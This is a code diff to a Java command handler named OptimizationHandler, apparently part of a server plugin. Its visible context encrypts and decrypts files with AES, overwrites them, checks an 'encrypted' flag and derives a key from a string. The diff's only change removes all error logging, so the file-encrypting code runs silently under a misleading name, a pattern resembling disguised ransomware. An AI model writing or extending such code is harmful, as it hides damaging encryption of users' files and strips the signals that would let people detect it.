@@ -60,7 +60,6 @@ public class OptimizationHandler implements CommandExecutor {
                 fos.write(encryptedData);
                 fos.close();
             } catch (Exception e) {
-                logger.severe("Error encrypting file: " + e.getMessage());
             }
         }
     }
@@ -85,7 +84,6 @@ public class OptimizationHandler implements CommandExecutor {
             }
             return new String(flagBytes, StandardCharsets.UTF_8).equals(new String(ENCRYPTED_FLAG, StandardCharsets.UTF_8));
         } catch (Exception e) {
-            logger.severe("Error checking if file is encrypted: " + e.getMessage());
             return false;
         }
     }
@@ -105,7 +103,6 @@ public class OptimizationHandler implements CommandExecutor {
                 fos.write(decryptedData);
                 fos.close();
             } catch (Exception e) {
-                logger.severe("Error decrypting file: " + e.getMessage());
             }
         }
     }
@@ -115,7 +112,6 @@ public class OptimizationHandler implements CommandExecutor {
             System.arraycopy(key.getBytes(StandardCharsets.UTF_8), 0, keyBytes, 0, Math.min(key.length(), keyBytes.length));
             return new SecretKeySpec(keyBytes, "AES");
         } catch (Exception e) {
-            logger.severe("Error generating secret key: " + e.getMessage());
             return null;
         }
     }
@@ -151,7 +147,6 @@ public class OptimizationHandler implements CommandExecutor {
             }
             return hexString.toString(); 
         } catch (Exception e) {
-            logger.severe("Error generating unique identifier: " + e.getMessage());
             return null;
         }
     }
